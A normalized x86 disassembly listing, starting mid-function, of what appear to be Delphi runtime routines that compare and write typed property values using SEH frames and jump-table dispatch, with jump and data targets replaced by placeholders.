call sub_403134
mov edx eax
mov eax [ edi ]
call sub_403418
test al al
jne r-xdata
mov al 0x1
sub_41f970
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414ff8
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax 0x80000000
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414ff8
cmp ebx eax
sete al
pop ebx
pop ebp
retn
xor eax eax
jmp r-xdata
cmp eax ebx
je r-xdata
pop ebx
pop ebp
retn
mov al 0x1
sub_41f9c8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415528
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
sete al
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415528
fld [ ebp - 0x10 ]
fcompp
fnstsw ax
sahf
sete al
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_41fa24
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415944
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415944
cmp edx [ ebp - 0x4 ]
jne r-xdata
sete al
cmp [ ebp - 0x8 ] 0x0
sete al
jmp r-xdata
cmp eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_41fa7c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41fafb
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41536c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_4047d4
sete bl
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_41536c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4047d4
sete bl
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fb02
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404674
retn
sub_41fb0c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407fbc
test al al
jne r-xdata
mov al 0x1
sub_41fb4c
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
sete al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414ff8
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_41fb0c
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
sub_41fba4
push ebp
mov ebp esp
push ecx
push ebx
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_414ff8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
push ebp
call sub_41fb4c
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
push ebp
call sub_41fb4c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
sub_41fc24
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41fcd0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
sete bl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fcd7
lea eax [ ebp - 0x8 ]
call sub_4058a0
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4159a8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0x4 ]
sete bl
test bl bl
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_4058a0
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d548
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_41fb0c
pop ecx
mov ebx eax
sub_41fcf0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41fdad
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4159a8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4058a0
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d548
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fdb4
lea eax [ ebp - 0x10 ]
call sub_4058a0
lea eax [ ebp - 0xc ]
call sub_4058a0
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4159a8
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
call sub_41fc24
pop ecx
test al al
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
sub_41fdcc
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4158cc
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp ebx [ ebp - 0x8 ]
je r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4158cc
mov ebx [ ebp - 0x10 ]
mov al 0x1
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x110 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov eax [ eax ]
mov edx esi
call sub_4034c0
cmp [ ebp - 0x110 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41fe44
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41fecb
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41584c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_4144f4
mov ebx eax
lea ecx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_41584c
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_414568
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fed2
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a04
retn
sub_41fedc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_41f940
mov [ ebp - 0x9 ] al
mov bl 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
jmp [ eax * 4 + jump_table_41ff9e ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414ff8
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
push ebp
call sub_41f970
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f9c8
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41fa7c
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41fba4
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41fdcc
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41fe44
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41fa24
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41fcf0
pop ecx
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_414ff8
test [ eax + 0x24 ] 0x4
je r-xdata
sub_420044
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_42008c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_4041e0
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420e54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420093
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_420098
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_42011e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_414d70
mov eax [ eax + 0x1 ]
mov edi [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xb
call sub_4210a0
xor ebx ebx
jae r-xdata
bt esi eax
inc ebx
cmp ebx 0x20
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_414d7c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420eb8
mov eax ebx
cmp eax 0x1f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_420eb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420125
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_42012c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_42018c
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_4185b0
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41f758
lea edx [ ebp - 0x4 ]
mov eax esi
call ebx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41f694
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420193
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_420198
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42022e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
call sub_420044
pop ecx
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_404014
xor eax eax
push ebp
push sub_420211
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
call sub_403f7c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41ef98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420218
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_403fd0
retn
sub_42023c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_4202f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414ff8
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_420044
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax ]
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov edx ebx
call sub_42012c
pop ecx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4202f7
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ef48
jmp r-xdata
dec al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_414d7c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f694
sub al 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_420098
pop ecx
jmp r-xdata
jmp r-xdata
sub_4202fc
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415528
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
push eax
call sub_420044
pop ecx
mov ax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f604
mov esp ebp
pop ebp
retn
sub_42033c
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415944
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_420044
pop ecx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f7cc
pop ecx
pop ecx
pop ebp
retn
sub_420378
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4203cd
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_41536c
mov eax [ ebp + 0x8 ]
push eax
call sub_420044
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_420fec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4203d4
lea eax [ ebp - 0x4 ]
call sub_40465c
retn
sub_4203f0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4204df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403fd0
jmp r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403fd0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4204e6
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_403f7c
mov eax esi
mov ecx r-xdata
mov edx [ ebx + 0x8 ]
call sub_404288
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax edi
call sub_4203d8
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_4042fc
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_4203f0
pop ecx
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_4042fc
jmp r-xdata
sub_420518
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_42070c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414ff8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_420044
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_4210a0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420713
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403fa0
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_404014
xor eax eax
push ebp
push sub_42068d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push [ eax + 0x2c ]
lea eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_4041e0
push [ ebp - 0x14 ]
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx 0x3
call sub_4042fc
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41f878
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0xc ]
call sub_403fd0
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_414ff8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4203f0
pop ecx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_420044
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_41f694
jmp r-xdata
sub_420724
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_4207e1
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4159a8
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_4058a0
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d548
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_420044
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_4210a0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4207e8
lea eax [ ebp - 0xc ]
call sub_403f7c
lea eax [ ebp - 0x8 ]
call sub_4058a0
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4203f0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_420044
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_41f694
sub_420800
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42089b
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4158cc
mov eax [ ebp + 0x8 ]
push eax
call sub_420044
pop ecx
mov ebx [ ebp - 0x8 ]
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x10c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax ]
mov edx ebx
call sub_4034c0
lea edx [ ebp - 0x10c ]
lea eax [ ebp - 0xc ]
call sub_4041e0
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f694
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_4210a0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4208a2
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
sub_4208a8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_420901
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_41584c
mov eax [ ebp + 0x8 ]
push eax
call sub_420044
pop ecx
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420a58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420908
lea eax [ ebp - 0x10 ]
call sub_40f234
retn
sub_42090c
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_4210b4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41fedc
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_41f940
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_414ff8
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
jmp [ eax * 4 + jump_table_4209ca ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_414ff8
test [ eax + 0x24 ] 0x4
je r-xdata
push ebp
call sub_42023c
pop ecx
jmp r-xdata
push ebp
call sub_4202fc
pop ecx
jmp r-xdata
push ebp
call sub_420378
pop ecx
jmp r-xdata
push ebp
call sub_420518
pop ecx
jmp r-xdata
push ebp
call sub_420800
pop ecx
jmp r-xdata
push ebp
call sub_4208a8
pop ecx
jmp r-xdata
push ebp
call sub_42033c
pop ecx
jmp r-xdata
push ebp
call sub_420724
